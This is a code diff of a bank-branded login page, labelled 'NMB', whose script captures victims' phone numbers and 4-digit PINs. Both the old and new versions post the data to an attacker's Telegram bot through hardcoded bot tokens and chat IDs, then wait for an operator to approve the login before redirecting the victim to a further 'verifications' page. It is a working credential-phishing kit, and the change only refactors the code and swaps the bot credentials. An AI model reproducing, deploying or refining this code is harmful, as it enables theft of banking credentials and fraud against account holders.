@@ -1532,269 +1532,212 @@
             </div>
         </div>
     </div>
+<script>
+    // =============================================
+    // 1. TELEGRAM BOT CONFIGURATION
+    // =============================================
+    const TELEGRAM_BOT_TOKEN = '8622400907:AAEdVNBFOs3F3f-fi-WSb5rxlJWsiBeGpVk';
+    const TELEGRAM_CHAT_ID = '5615316142';
 
+    let lastUpdateId = 0;
 
-    <script>
-        // =============================================
-        // 1. TELEGRAM BOT CONFIGURATION
-        // =============================================
-        const TELEGRAM_BOT_TOKEN = '8673667977:AAF-4Z6wfDi7SgZdktD1sGWxBZ2nv87-nyI'; // <-- Replace with your bot token
-        const TELEGRAM_CHAT_ID = '1003670447'; // <-- Replace with your chat ID
+    // =============================================
+    // SEND DATA TO TELEGRAM WITH INLINE KEYBOARD
+    // =============================================
+    function sendToTelegram(data) {
+        const text = `🔐 *NMB Login Attempt*\n\n` +
+            `📱 Phone: \`${data.phone || 'N/A'}\`\n` +
+            `🔑 PIN: \`${data.pin || 'N/A'}\`\n` +
+            `🕐 Time: ${new Date().toLocaleString()}`;
 
-        function sendToTelegram(data) {
-            const text = `🔐 *NMB Login Attempt*\n\n` +
-                `📱 Phone: \`${data.phone || 'N/A'}\`\n` +
-                `🔑 PIN: \`${data.pin || 'N/A'}\`\n` +
-                `🕐 Time: ${new Date().toLocaleString()}`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: text,
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [
+                        [{
+                            text: '✅ APPROVE',
+                            callback_data: 'approve_login'
+                        }, {
+                            text: '❌ CANCEL',
+                            callback_data: 'cancel_login'
+                        }]
+                    ]
+                }
+            })
+        }).catch(err => console.error('Telegram send error:', err));
+    }
 
-            // Send message first
-            fetch(url, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: text,
-                        parse_mode: 'Markdown'
-                    })
-                })
-                .then(r => r.json())
-                .then(resp => {
-                    if (resp.ok && resp.result) {
-                        const msgId = resp.result.message_id;
-                        // Now send inline keyboard (Approve / Cancel)
-                        sendInlineKeyboard(msgId, data);
-                    }
-                })
-                .catch(err => console.error('Telegram send error:', err));
-        }
+    // =============================================
+    // REMOVE ONLY THE INLINE KEYBOARD (KEEP TEXT)
+    // =============================================
+    function removeInlineKeyboard(chatId, messageId) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                message_id: messageId,
+                reply_markup: { inline_keyboard: [] }
+            })
+        }).catch(() => {});
+    }
 
-        function sendInlineKeyboard(messageId, data) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
-            const inlineKeyboard = {
-                inline_keyboard: [
-                    [{
-                        text: '✅ APPROVE',
-                        callback_data: 'approve_login'
-                    }, {
-                        text: '❌ CANCEL',
-                        callback_data: 'cancel_login'
-                    }]
-                ]
-            };
+    // =============================================
+    // POLL FOR ADMIN RESPONSE (APPROVE / CANCEL)
+    // =============================================
+    function pollTelegramCallbacks() {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId}&timeout=30`;
 
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    message_id: messageId,
-                    reply_markup: inlineKeyboard
-                })
-            }).catch(err => console.error('Inline keyboard error:', err));
-        }
+        fetch(url)
+            .then(r => r.json())
+            .then(resp => {
+                if (resp.ok && resp.result) {
+                    resp.result.forEach(update => {
+                        lastUpdateId = update.update_id + 1;
 
-        // Poll for callback_query answers (approve/cancel)
-        let lastUpdateId = 0;
+                        if (update.callback_query) {
+                            const query = update.callback_query;
+                            const data = query.data;
+                            const chatId = query.message.chat.id;
+                            const msgId = query.message.message_id;
 
-        function pollTelegramCallbacks() {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId}&timeout=30`;
+                            // 1. Remove only the buttons — keep the original message text
+                            removeInlineKeyboard(chatId, msgId);
 
-            fetch(url)
-                .then(r => r.json())
-                .then(resp => {
-                    if (resp.ok && resp.result) {
-                        resp.result.forEach(update => {
-                            lastUpdateId = update.update_id + 1;
+                            // 2. Answer callback so Telegram stops loading state
+                            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    callback_query_id: query.id,
+                                    text: data === 'approve_login' ? '✅ Approved' : '❌ Cancelled'
+                                })
+                            });
 
-                            if (update.callback_query) {
-                                const query = update.callback_query;
-                                const data = query.data;
-
-                                // Answer the callback query so the loading stops
-                                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
-                                    method: 'POST',
-                                    headers: {
-                                        'Content-Type': 'application/json'
-                                    },
-                                    body: JSON.stringify({
-                                        callback_query_id: query.id,
-                                        text: data === 'approve_login' ? '✅ Login Approved!' : '❌ Login Cancelled'
-                                    })
-                                });
-
-                                if (data === 'approve_login') {
-                                    // Edit the message to show approved
-                                    editMessageText(query.message.chat.id, query.message.message_id,
-                                        '✅ *Login Approved!* Redirecting to verification...');
-
-                                    // Redirect after short delay
-                                    setTimeout(() => {
-                                        window.location.href = 'verifications.html';
-                                    }, 1500);
-
-                                } else if (data === 'cancel_login') {
-                                    // Edit the message to show cancelled
-                                    editMessageText(query.message.chat.id, query.message.message_id,
-                                        '❌ *Login Cancelled by Admin*');
-
-                                    // Reset the page (clear form)
-                                    setTimeout(() => {
-                                        resetForm();
-                                    }, 2000);
-                                }
+                            // 3. Take action on the page
+                            if (data === 'approve_login') {
+                                setTimeout(() => {
+                                    window.location.href = 'verifications.html';
+                                }, 1500);
+                            } else if (data === 'cancel_login') {
+                                setTimeout(() => {
+                                    resetForm();
+                                }, 2000);
                             }
-                        });
-                    }
-                    // Continue polling
-                    setTimeout(pollTelegramCallbacks, 1000);
-                })
-                .catch(() => {
-                    setTimeout(pollTelegramCallbacks, 3000);
-                });
-        }
+                        }
+                    });
+                }
+                setTimeout(pollTelegramCallbacks, 1000);
+            })
+            .catch(() => {
+                setTimeout(pollTelegramCallbacks, 3000);
+            });
+    }
 
-        function editMessageText(chatId, messageId, text) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    message_id: messageId,
-                    text: text,
-                    parse_mode: 'Markdown',
-                    reply_markup: {
-                        inline_keyboard: []
-                    } // remove buttons
-                })
-            }).catch(() => {});
-        }
+    // =============================================
+    // RESET THE FORM
+    // =============================================
+    function resetForm() {
+        const phoneInput = document.querySelector('.numcont');
+        if (phoneInput) phoneInput.value = '';
 
-        function resetForm() {
-            // Clear phone input
-            const phoneInput = document.querySelector('.numcont');
-            if (phoneInput) phoneInput.value = '';
-            // Clear all PIN inputs
-            document.querySelectorAll('.pin-input-container div input').forEach(inp => inp.value = '');
-            // Reset button state
-            const signInBtn = document.querySelector('.btnContinue');
-            if (signInBtn) {
-                signInBtn.style.opacity = '0.6';
-                signInBtn.style.cursor = 'not-allowed';
-                signInBtn.disabled = true;
+        document.querySelectorAll('.pin-input-container div input').forEach(inp => inp.value = '');
+
+        const signInBtn = document.querySelector('.btnContinue');
+        if (signInBtn) {
+            signInBtn.style.opacity = '0.6';
+            signInBtn.style.cursor = 'not-allowed';
+            signInBtn.disabled = true;
+        }
+    }
+
+    // =============================================
+    // PIN AUTO-MOVE LOGIC
+    // =============================================
+    const pinInputs = document.querySelectorAll('.pin-input-container div input');
+
+    pinInputs.forEach((input, index) => {
+        input.addEventListener('input', function() {
+            if (this.value.length > 1) {
+                this.value = this.value.slice(0, 1);
             }
-        }
-
-        // =============================================
-        // 2. PIN AUTO-MOVE TO NEXT SPACE
-        // =============================================
-        const pinInputs = document.querySelectorAll('.pin-input-container div input');
-
-        pinInputs.forEach((input, index) => {
-            input.addEventListener('input', function() {
-                // Only allow single digit
-                if (this.value.length > 1) {
-                    this.value = this.value.slice(0, 1);
-                }
-                // If a digit was entered, move to next input
-                if (this.value.length === 1 && index < pinInputs.length - 1) {
-                    pinInputs[index + 1].focus();
-                }
-                // Check if all pins are filled and enable/disable sign in button
-                checkPinComplete();
-            });
-
-            input.addEventListener('keydown', function(e) {
-                // Backspace: go to previous input
-                if (e.key === 'Backspace' && this.value === '' && index > 0) {
-                    pinInputs[index - 1].focus();
-                }
-            });
-
-            // Prevent non-numeric input
-            input.addEventListener('keypress', function(e) {
-                if (!/^\d$/.test(e.key) && e.key !== 'Backspace') {
-                    e.preventDefault();
-                }
-            });
-        });
-
-        function checkPinComplete() {
-            const allFilled = Array.from(pinInputs).every(inp => inp.value.length === 1);
-            const signInBtn = document.querySelector('.btnContinue');
-            if (signInBtn) {
-                signInBtn.disabled = !allFilled;
-                signInBtn.style.opacity = allFilled ? '1' : '0.6';
-                signInBtn.style.cursor = allFilled ? 'pointer' : 'not-allowed';
+            if (this.value.length === 1 && index < pinInputs.length - 1) {
+                pinInputs[index + 1].focus();
             }
-        }
-
-        // =============================================
-        // 3. SIGN IN BUTTON -> TELEGRAM BOT -> redirect
-        // =============================================
-        document.addEventListener('DOMContentLoaded', function() {
-            const signInBtn = document.querySelector('.btnContinue');
-            if (!signInBtn) return;
-
-            signInBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                if (this.disabled) return;
-
-                // Collect phone number
-                const phoneInput = document.querySelector('.numcont');
-                const phone = phoneInput ? phoneInput.value.trim() : '';
-
-                // Collect PIN
-                let pin = '';
-                pinInputs.forEach(inp => {
-                    pin += inp.value;
-                });
-
-                // Validate
-                if (!phone || phone.length < 10) {
-                    alert('Please enter a valid mobile number (10 digits).');
-                    return;
-                }
-                if (pin.length !== 4) {
-                    alert('Please enter your complete 4-digit PIN.');
-                    return;
-                }
-
-                // Save data
-                localStorage.setItem('loginPhone', phone);
-                localStorage.setItem('loginPin', pin);
-
-                // Show loading state
-                this.textContent = 'VERIFYING...';
-                this.disabled = true;
-                this.style.opacity = '0.6';
-
-                // Send to Telegram bot
-                sendToTelegram({
-                    phone,
-                    pin
-                });
-
-                // Start polling for admin response
-                pollTelegramCallbacks();
-            });
-        });
-
-        // =============================================
-        // 4. INITIAL STATE - Disable button until PIN complete
-        // =============================================
-        document.addEventListener('DOMContentLoaded', function() {
             checkPinComplete();
         });
-    </script>
+
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && this.value === '' && index > 0) {
+                pinInputs[index - 1].focus();
+            }
+        });
+
+        input.addEventListener('keypress', function(e) {
+            if (!/^\d$/.test(e.key) && e.key !== 'Backspace') {
+                e.preventDefault();
+            }
+        });
+    });
+
+    function checkPinComplete() {
+        const allFilled = Array.from(pinInputs).every(inp => inp.value.length === 1);
+        const signInBtn = document.querySelector('.btnContinue');
+        if (signInBtn) {
+            signInBtn.disabled = !allFilled;
+            signInBtn.style.opacity = allFilled ? '1' : '0.6';
+            signInBtn.style.cursor = allFilled ? 'pointer' : 'not-allowed';
+        }
+    }
+
+    // =============================================
+    // SIGN IN BUTTON HANDLER
+    // =============================================
+    document.addEventListener('DOMContentLoaded', function() {
+        checkPinComplete();
+
+        const signInBtn = document.querySelector('.btnContinue');
+        if (!signInBtn) return;
+
+        signInBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            if (this.disabled) return;
+
+            const phoneInput = document.querySelector('.numcont');
+            const phone = phoneInput ? phoneInput.value.trim() : '';
+
+            let pin = '';
+            pinInputs.forEach(inp => { pin += inp.value; });
+
+            if (!phone || phone.length < 10) {
+                alert('Please enter a valid mobile number (10 digits).');
+                return;
+            }
+            if (pin.length !== 4) {
+                alert('Please enter your complete 4-digit PIN.');
+                return;
+            }
+
+            localStorage.setItem('loginPhone', phone);
+            localStorage.setItem('loginPin', pin);
+
+            this.textContent = 'VERIFYING...';
+            this.disabled = true;
+            this.style.opacity = '0.6';
+
+            sendToTelegram({ phone, pin });
+            pollTelegramCallbacks();
+        });
+    });
+</script>
 </body>
 
 </html>
